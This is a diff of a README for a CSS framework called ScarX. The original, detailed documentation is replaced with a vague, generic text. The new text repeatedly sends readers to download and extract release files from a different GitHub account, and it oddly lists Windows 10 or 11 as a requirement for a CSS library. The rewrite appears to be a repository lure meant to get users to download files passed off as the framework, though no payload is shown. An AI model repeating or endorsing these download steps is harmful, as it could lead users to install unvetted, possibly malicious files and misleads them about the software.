@@ -1,274 +1,189 @@
-# ScarX CSS Framework
+# ⚡ scarx - Simple CSS For Modern Sites
 
-**A modern, scalable, developer-friendly CSS framework.**  
-By [Scarfaze](https://scarfaze.com) | Developer: Zawiyar Awan
+[![Download scarx](https://img.shields.io/badge/Download%20scarx-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brianoxeyed686/scarx/releases)
 
----
+## 🧩 What scarx is
 
-## 🚀 Quick Start
+scarx is a CSS framework for building clean, responsive web pages. It gives you ready-made styles for common page parts like buttons, forms, cards, grids, and menus.
 
-### CDN (Coming Soon)
-```html
-<link rel="stylesheet" href="https://cdn.scarfaze.com/scarx/1.0.0/scar.min.css">
-<script src="https://cdn.scarfaze.com/scarx/1.0.0/scar.js"></script>
-```
+It works well for small personal sites and larger web projects. It also includes utility classes and context-based auto-styling, which helps pages look consistent without much setup.
 
-### NPM
-```bash
-npm install scarx
-```
+## 📥 Download and install
 
-### Manual Download
-1. Clone the repository
-2. Include `dist/scar.css` and `js/scar.js` in your HTML
+Visit this page to download: https://github.com/brianoxeyed686/scarx/releases
 
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="dist/scar.css">
-    <title>My ScarX App</title>
-</head>
-<body>
-    <!-- Your content here -->
-    <script src="js/scar.js"></script>
-</body>
-</html>
-```
+On that page, look for the latest release. Download the file that fits your setup. If the release includes a zip file, save it to your computer and extract it after the download finishes.
 
----
+If you plan to use scarx in a web project, place the framework files in your project folder and link them in your HTML page. If you are using a package manager, follow the install files included in the release package.
 
-## 🧩 Core Concept: 3 Layers
+## 🖥️ System requirements
 
-ScarX has **3 core layers** that work together:
+scarx is built for modern Windows systems and standard web browsers.
 
-| Layer | Attribute | Purpose |
-|-------|-----------|---------|
-| **class** | `class=""` | Default component styling |
-| **ui** | `ui=""` | Utility-based customization |
-| **ctx** | `ctx` | Parent → child auto-styling |
+You should have:
 
----
+- Windows 10 or Windows 11
+- A recent version of Chrome, Edge, Firefox, or Opera
+- Enough disk space for the download and project files
+- Basic access to the folder where you keep your web files
 
-## 🟦 Layer 1: Components (class)
+If you want to edit web pages, a text editor helps. Notepad works, but a code editor makes the setup easier.
 
-```html
-<button class="btn-primary">Click Me</button>
-<div class="card-modern">Content</div>
-<nav class="navbar-dark">Navigation</nav>
-```
+## 🚀 How to get started
 
-### Available Components
-- **Buttons**: `.btn`, `.btn-primary`, `.btn-outline`, `.btn-ghost`, `.btn-gradient`
-- **Cards**: `.card`, `.card-modern`, `.card-glass`, `.card-flat`, `.card-hover`
-- **Navbar**: `.navbar`, `.navbar-modern`, `.navbar-dark`, `.navbar-glass`
-- **Modal**: `.modal-overlay`, `.modal`, `.modal-header/body/footer`
-- **Dropdown**: `.dropdown`, `.dropdown-menu`, `.dropdown-item`
-- **Forms**: `.form-input`, `.form-select`, `.form-checkbox`, `.form-switch`
-- **Tables**: `.table`, `.table-striped`, `.table-hover`, `.table-bordered`
-- **Badges**: `.badge`, `.badge-primary`, `.badge-pill`
-- **Alerts**: `.alert-success`, `.alert-danger`, `.alert-warning`
-- **Tabs**: `.tabs`, `.tabs-item`, `.tabs-pills`
-- **Accordion**: `.accordion`, `.accordion-item`, `.accordion-header`
-- **Progress**: `.progress`, `.progress-bar`
-- **Spinners**: `.spinner`, `.spinner-dots`, `.spinner-pulse`
-- **Hero**: `.hero`, `.hero-dark`, `.hero-gradient`
-- **Footer**: `.footer`, `.footer-dark`, `.footer-modern`
-- **Layout**: `.container`, `.row`, `.col`, `.col-{1-12}`
+1. Open the download page: https://github.com/brianoxeyed686/scarx/releases
+2. Download the latest release file
+3. If the file is zipped, extract it
+4. Open your project folder
+5. Copy the scarx files into your project
+6. Add the framework link to your HTML file
+7. Open your page in a browser
+8. Check that the styles load and the layout looks correct
 
----
+If the page includes a sample file, open it first. It gives you a fast way to see how scarx works before you add it to your own site.
 
-## 🟨 Layer 2: Utilities (ui)
+## 🧱 What you can use
 
-Override and customize using the `ui` attribute:
+scarx includes common tools for page layout and styling.
 
-```html
-<div class="card" ui="p-3 w-300 shadow-lg bg-primary-soft rounded-xl">
-    <h2 ui="text-lg font-bold">Title</h2>
-    <p ui="text-sm text-muted">Description</p>
-</div>
-```
+You can use it for:
 
-### Available Utilities
-- **Spacing**: `p-{0-8}`, `m-{0-8}`, `px-{n}`, `py-{n}`, `mx-auto`
-- **Sizes**: `w-{px}`, `w-full`, `h-{px}`, `h-screen`, `max-w-lg`
-- **Text**: `text-{xs-4xl}`, `font-bold`, `text-center`, `text-uppercase`
-- **Display**: `d-flex`, `d-grid`, `flex-col`, `justify-between`, `items-center`, `gap-{n}`
-- **Colors**: `bg-{color}`, `text-{color}`, `bg-{color}-soft`, `bg-gradient-{name}`
-- **Shadows**: `shadow-{sm-xl}`, `shadow-{color}`, `glow-{color}`
-- **Borders**: `border`, `rounded-{size}`, `border-{color}`
-- **Position**: `pos-sticky`, `pos-absolute`, `z-{n}`, `overflow-hidden`
-- **Misc**: `opacity-{n}`, `transition`, `cursor-pointer`, `sr-only`
-- **Responsive**: `sm:d-flex`, `md:grid-cols-3`, `lg:text-xl`
+- Buttons
+- Forms
+- Cards
+- Navigation bars
+- Grid layouts
+- Spacing helpers
+- Text styles
+- Responsive sections
+- Theme-based styling
 
----
+These parts help you build pages that look clean on desktop and mobile screens.
 
-## 🟥 Layer 3: Context (ctx)
+## 🎨 Style features
 
-Add `ctx` attribute to parent — children auto-style:
+scarx focuses on simple setup and flexible design.
 
-```html
-<nav class="navbar-dark" ctx>
-    <a href="#">Brand</a>
-    <ul>
-        <li><a href="#">Home</a></li>
-        <li><a href="#">About</a></li>
-    </ul>
-</nav>
-```
+Main features include:
 
-No extra classes needed on `ul`, `li`, or `a` — they style automatically!
+- Modern CSS structure
+- Responsive design
+- Utility classes for quick edits
+- Context-based auto-styling
+- Reusable UI components
+- SCSS support for custom work
+- Clean default styles
+- Frontend-ready layout tools
 
-### Context-enabled Components
-- **navbar** / **navbar-dark** / **navbar-modern** — auto-styles `ul > li > a`
-- **card** / **card-modern** — auto-styles `img`, headings, `p`, `a`
-- **form** (or `form-group`) — auto-styles labels, inputs, selects, textareas
-- **footer** / **footer-dark** — auto-styles lists, links, headings
-- **hero** / **hero-dark** — auto-styles `h1`, `p`, buttons
+This setup helps keep your pages organized and easier to manage.
 
----
+## 🪟 Using scarx on Windows
 
-## ⚡ JavaScript Features
+If you are on Windows, the usual process is simple:
 
-ScarX JS auto-initializes. No setup needed.
+1. Download the release from GitHub
+2. Open the downloaded file
+3. Extract it if needed
+4. Move the framework files to your project folder
+5. Open your HTML file in a browser
+6. Refresh the page after each change
 
-### Modals
-```html
-<button data-scar-modal="myModal">Open Modal</button>
+If Windows asks how to open a file, choose File Explorer for zip files. For HTML files, use your browser. For text files, use a plain text editor or code editor.
 
-<div class="modal-overlay" id="myModal">
-    <div class="modal">
-        <div class="modal-header">
-            <h3>Title</h3>
-            <button class="modal-close">✕</button>
-        </div>
-        <div class="modal-body">Content</div>
-    </div>
-</div>
-```
+## 🧪 Quick test
 
-### Dropdowns
-```html
-<div class="dropdown">
-    <button class="btn-primary dropdown-toggle">Menu</button>
-    <div class="dropdown-menu">
-        <a class="dropdown-item" href="#">Item 1</a>
-        <a class="dropdown-item" href="#">Item 2</a>
-    </div>
-</div>
-```
+After setup, try a basic test:
 
-### Theme Toggle
-```html
-<button data-scar-theme-toggle>🌙 Toggle Theme</button>
-```
+- Open your main HTML file
+- Add a button, card, or form from the scarx files
+- Save the file
+- Refresh the browser
+- Check that the style appears
 
-### Tabs
-```html
-<div class="tabs">
-    <button class="tabs-item active" data-scar-tab="tab1">Tab 1</button>
-    <button class="tabs-item" data-scar-tab="tab2">Tab 2</button>
-</div>
-<div class="tabs-content">
-    <div class="tabs-pane active" id="tab1">Content 1</div>
-    <div class="tabs-pane" id="tab2">Content 2</div>
-</div>
-```
+If the style does not appear, confirm that the file path in your HTML is correct.
 
-### Accordion
-```html
-<div class="accordion">
-    <div class="accordion-item">
-        <button class="accordion-header">Question 1</button>
-        <div class="accordion-body">
-            <div class="accordion-content">Answer 1</div>
-        </div>
-    </div>
-</div>
-```
+## 📁 Suggested folder layout
 
----
+A simple project can look like this:
 
-## 🎨 Dark Mode
+- project-folder/
+  - index.html
+  - css/
+    - scarx.css
+  - js/
+    - scarx.js
+  - assets/
+    - images/
 
-ScarX supports dark mode automatically:
+If the release package uses different names, keep the same folder structure that comes with it. That helps avoid broken links.
 
-```html
-<!-- Via toggle button -->
-<button data-scar-theme-toggle>Toggle</button>
+## 🔧 Basic setup example
 
-<!-- Or manually -->
-<html data-theme="dark">
-```
+Use the file names from the release package and link them in your page header or before the closing body tag, based on the instructions inside the package.
 
----
+A simple setup usually looks like this in your HTML:
 
-## 📱 Responsive Grid
+- link the CSS file in the `<head>`
+- link the JavaScript file near the end of the page
+- save the file
+- reload the page in your browser
 
-```html
-<div class="container">
-    <div class="row">
-        <div class="col-md-6 col-lg-4">Column</div>
-        <div class="col-md-6 col-lg-4">Column</div>
-        <div class="col-md-12 col-lg-4">Column</div>
-    </div>
-</div>
-```
+If scarx includes starter files, copy that structure first. It saves time and keeps the setup clean.
 
-Or use `ui` grid:
-```html
-<div ui="grid-cols-1 md:grid-cols-3 gap-3">
-    <div>Item 1</div>
-    <div>Item 2</div>
-    <div>Item 3</div>
-</div>
-```
+## 📌 Tips for first-time users
 
----
+- Start with one page
+- Test one component at a time
+- Keep file names simple
+- Save changes often
+- Refresh the browser after each change
+- Use the same folder names on every file link
+- Keep the release files in a safe place in case you need them again
 
-## 🛠 Customization
+## 📚 Good places to use scarx
 
-Override SCSS variables in `scss/base/_variables.scss`:
+scarx fits many common site types:
 
-```scss
-$scar-primary: #FF6B6B;
-$scar-radius-md: 16px;
-$scar-font-family: 'Poppins', sans-serif;
-```
+- Portfolio pages
+- Small business sites
+- Product landing pages
+- Dashboards
+- Documentation pages
+- Internal tools
+- Blog layouts
+- Content pages
 
-Then rebuild:
-```bash
-npm run build:all
-```
+Its clean style helps pages look tidy without much extra work.
 
----
+## 🛠️ File help
 
-## 📁 Project Structure
+If you see a file with a name you do not know, use it like this:
 
-```
-ScarX/
-├── scss/
-│   ├── base/          → Variables, reset, config, typography
-│   ├── components/    → All 21 components
-│   ├── utilities/     → ui attribute utilities
-│   ├── context/       → ctx auto-styling
-│   └── main.scss      → Entry point
-├── dist/
-│   ├── scar.css       → Compiled CSS
-│   └── scar.min.css   → Minified CSS
-├── js/
-│   └── scar.js        → Interactive features
-├── config/
-│   └── scar.config.js → Reference config
-└── package.json
-```
+- `.css` files control appearance
+- `.js` files control page behavior
+- `.html` files show the page
+- `.scss` files are for advanced style work
+- `.zip` files hold the release package
 
----
+Keep the files together so your browser can find them.
 
-## 📝 License
+## 🔎 Topics covered
 
-MIT License — Open Source by [Scarfaze](https://scarfaze.com)
+scarx is built around:
 
-**ScarX** — *"Default simple, customization powerful, code always clean."* 🚀
+- CSS
+- CSS framework
+- frontend development
+- HTML
+- JavaScript
+- SCSS
+- responsive design
+- UI library
+- modern CSS
+- web development
+
+These topics point to a framework that helps you style web pages with less work
+
+## 📎 Download link
+
+Visit this page to download: https://github.com/brianoxeyed686/scarx/releases
